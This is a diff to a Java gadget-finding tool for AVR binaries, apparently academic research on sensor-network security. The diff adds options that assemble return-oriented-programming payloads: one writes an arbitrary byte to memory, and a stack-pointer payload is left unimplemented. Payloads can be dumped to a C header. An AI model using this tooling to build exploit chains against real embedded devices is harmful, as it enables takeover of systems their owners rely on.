@@ -52,19 +52,37 @@ import cck.util.Util;
 
 /**
  * The <code>FindGadgetsAction</code> class represents an action that allows
- * the user to disassemble a binary file and Lookup the postential "gadgets"
+ * the user to disassemble a binary file and Lookup the potential "gadgets"
  * found in the code ....
+ * This is not particulary well made, if i had to do it again i would make 
+ * it much cleaner, I will do it if i have some spare time ...
  * 
+ * reusing code written by: 
  * @author Ben L. Titzer,
- * @author A. Francillon
+ * all bugs and mess from:
+ * @author A. Francillon 
  */
 public class FindGadgetsAction extends Action {
-
+    
     Option.Str ARCH = newOption("arch", "avr",
             "This option selects the architecture for the disassembler.");
+    
+    Option.Str META_INSTR= newOption("metainstr", "LD",
+        "Builds a payload to execute the meta instruction given in parameter."
+         +"default value is LD, possible values are \n "
+         + "LD load a byte into arbitrary memory area \n"
+         + "SP change Stack Pointer \n" 
+         + "NONE just dump all gadgets\n"
+         );
+
 
     Option.Long MAX_LENGTH = newOption("max-length", 16,
             "This option specifies the maximum length of an instruction in bytes.");
+    
+    Option.Str OUTFILE = newOption(
+            "outfile",
+            "",
+            "When this option is specified, teh payload will be dumped into a C header file .");
 
     Option.Str FILE = newOption(
             "file",
@@ -94,24 +112,52 @@ public class FindGadgetsAction extends Action {
      *             instructions in the file
      */
     public void run(String[] args) throws Exception {
-        Byte[] buf;
-
+        //Byte[] buf;
+        
         // AbstractArchitecture arch =
         // ArchitectureRegistry.getArchitecture(ARCH.get());
         // da = arch.getDisassembler();
-        if (FILE.isBlank()) {
-            throw new Exception("File not found ");
-        }
+        
+        
         // load and lookup a file for gadgets
         Terminal.println("searching for gadgets in file " + FILE.get());
         gadgets = findGadgets();
         // gadgets.print();
-
+        Terminal.println("->"+META_INSTR.get());
+        if (META_INSTR.get().equals("NONE")){
+            gadgets.print();
+            return;
+        }
+        Payload buf;
+        if (META_INSTR.get()=="LD"){
         // write Byte 0x0A to address 0x0190
-        buf = createShellCodeInjectByteToMemory((byte) 10, 400);
-        PrintPayload(buf);
+            Terminal.println("Gadget for injecting one byte :");
+            buf = createShellCodeInjectByteToMemory((byte) 0xAF, 0xDEAF );
+        }else if (META_INSTR.get()=="SP"){
+            Terminal.println("Gadget for changing :");
+            buf = createShellCodeChangeSP(0xDEAF );          
+        }else{
+            Terminal.println(META_INSTR.get()+" not implemented");
+            return;   
+        }
+        // and one for the C file 
+        //      TODO : bueark   
+        if(!OUTFILE.get().equals("")){
+            buf.PrintPayload(OUTFILE.get());
+        }else{
+            // one for the terminal 
+            buf.PrintPayload();
+        }
+        
+        //buf.PrintPayload("/home/francill/work/UbisecSens/usss-git/tinyos-2.x/apps/VulnToLeds/self/payloads.h");
         // inject payload ?
 
+    }
+
+    private Payload createShellCodeChangeSP(int address) {
+        // TODO Auto-generated method stub
+        Terminal.println("createShellCodeChangeSP Not Implemented");
+        return new Payload();
     }
 
     /**
@@ -122,32 +168,28 @@ public class FindGadgetsAction extends Action {
      * @throws Exception
      */
     @SuppressWarnings("unchecked")
-    public Byte[] createShellCodeInjectByteToMemory(byte value, Integer address)
+    public Payload createShellCodeInjectByteToMemory(byte value, Integer address)
             throws LegacyInstr.InvalidImmediate {
 
-        Byte[] payload1 = null;
-        Byte[] payload2 = null;
-        Byte[] payload3 = null;
-
-        payload1 = createShellCodeInjectByteToMemory_strategy1(value, address);
-        payload2 = createShellCodeInjectByteToMemory_strategy2(value, address);
-        payload3 = createShellCodeInjectByteToMemory_strategy3(value, address);
+        Payload payload1 = createShellCodeInjectByteToMemory_strategy1(value, address);
+        Payload payload2 = createShellCodeInjectByteToMemory_strategy2(value, address);
+        Payload payload3 = createShellCodeInjectByteToMemory_strategy3(value, address);
 
 //        payload2 = createShellCodeInjectByteToMemory_strategy_memcpy(value,
 //                address);
 
-        // Terminal.println("Strategy 1:");
-        // PrintPayload(payload1);
-        // Terminal.println("Strategy 2:");
-        // PrintPayload(payload2);
-        // Terminal.println("Strategy 3:");
-        // PrintPayload(payload3);
-        //        
-        if (payload3.length < payload1.length
-                && payload3.length < payload2.length)
+         Terminal.println("Strategy 1:");
+         payload1.PrintPayload();
+         Terminal.println("Strategy 2:");
+         payload2.PrintPayload();
+         Terminal.println("Strategy 3:");
+         payload3.PrintPayload();
+                
+        if (payload3.size() < payload1.size()
+                && payload3.size() < payload2.size())
             return payload3;
-        if (payload2.length < payload1.length
-                && payload2.length < payload3.length)
+        if (payload2.size() < payload1.size()
+                && payload2.size() < payload3.size())
             return payload2;
         else
             return payload1;
@@ -163,12 +205,16 @@ public class FindGadgetsAction extends Action {
 //            throws LegacyInstr.InvalidImmediate {
 //
 //    }
-
-    private Byte[] createShellCodeInjectByteToMemory_strategy_memcpy(
-            byte value, Integer address) {
-
-        return null;
-    }
+//
+//    private Byte[] createShellCodeInjectByteToMemory_strategy_memcpy(
+//            byte value, Integer address) {
+//
+//        Payload.PayloadMemcpy payload=createShellCodeMemcpy();
+//            
+//            
+//        
+//        return null;
+//    }
 
     /**
      * CreateShellCodeInjectByteToMemory builds a shell code it for current
@@ -219,7 +265,7 @@ public class FindGadgetsAction extends Action {
      * @throws Exception
      */
     @SuppressWarnings("unchecked")
-    public Byte[] createShellCodeInjectByteToMemory_strategy1(byte value,
+    public Payload createShellCodeInjectByteToMemory_strategy1(byte value,
             Integer address) throws LegacyInstr.InvalidImmediate {
 
         Terminal.println("======== Strategy 1 ==========");
@@ -265,7 +311,7 @@ public class FindGadgetsAction extends Action {
 
             // return array;
 
-            return payload.toByteArray();
+            return payload;
             // return array;
 
         } else {
@@ -284,7 +330,7 @@ public class FindGadgetsAction extends Action {
      * @throws Exception
      */
     @SuppressWarnings("unchecked")
-    public Byte[] createShellCodeInjectByteToMemory_strategy3(byte value,
+    public Payload createShellCodeInjectByteToMemory_strategy3(byte value,
             Integer address) throws LegacyInstr.InvalidImmediate {
 
         Terminal.println("======== Strategy 3 ==========");
@@ -312,9 +358,9 @@ public class FindGadgetsAction extends Action {
                 .firstKey())).r2.getNumber();
         ArrayList<Feature> features_pop_reg_for_movw = new ArrayList<Feature>();
         features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,
-                movw_src_reg, Arithmetic.low(address)));
+                movw_src_reg, Arithmetic.low(address),Feature.ADDR_LOW));
         features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,
-                movw_src_reg + 1, Arithmetic.high(address)));
+                movw_src_reg + 1, Arithmetic.high(address),Feature.ADDR_HIGH));
 
         GadgetsSet pop_reg_for_movw_gadgets = gadgets
                 .filterGadgets(features_pop_reg_for_movw);
@@ -325,7 +371,7 @@ public class FindGadgetsAction extends Action {
         // chances to corrupt register
         ArrayList<Feature> features_dataReg = new ArrayList<Feature>();
         features_dataReg
-                .add(new Feature(LegacyInstr.POP.class, payload.getDataReg(), value));
+                .add(new Feature(LegacyInstr.POP.class, payload.getDataReg(), value,Feature.DATA));
         GadgetsSet pop_dataReg = gadgets.filterGadgets(features_dataReg);
 
         Terminal
@@ -337,7 +383,7 @@ public class FindGadgetsAction extends Action {
         payload.addGadget(pop_reg_for_movw_gadgets.smallestStackSize(),
                     features_pop_reg_for_movw);
 
-        return payload.toByteArray();
+        return payload;
 
     }
 
@@ -349,7 +395,7 @@ public class FindGadgetsAction extends Action {
      * @throws Exception
      */
     @SuppressWarnings("unchecked")
-    public Byte[] createShellCodeInjectByteToMemory_strategy2(byte value,
+    public Payload createShellCodeInjectByteToMemory_strategy2(byte value,
             Integer address) throws LegacyInstr.InvalidImmediate {
         Terminal.println("======== Strategy 2 ==========");
 
@@ -383,7 +429,7 @@ public class FindGadgetsAction extends Action {
             popDataGadgets.smallest().print();
             payload.addGadget( popAddrGadgets.smallest(),features_addr);
             payload.addGadget(popDataGadgets.smallest(), features_data);
-            return payload.toByteArray();
+            return payload;
         }
         return null;
 
@@ -596,28 +642,6 @@ public class FindGadgetsAction extends Action {
         }
         print(buf, off, len, result);
         return len;
-    }
-
-    /**
-     * Print a C shapped array containing payload
-     * 
-     * @param buf
-     */
-
-    private void PrintPayload(Byte[] buf) {
-        if (buf == null) {
-            Terminal.println("//none");
-            return;
-        }
-
-        Terminal.println("uint8_t payload_length=" + buf.length + ";");
-        Terminal.print("payload={");
-        for (int i = 0; i < buf.length; i++) {
-            Terminal.print(StringUtil.to0xHex(buf[i], 2));
-            if (i < buf.length - 1)
-                Terminal.print(",");
-        }
-        Terminal.println("};");
     }
 
     private static void print(byte[] buf, int off, int len, String str) {
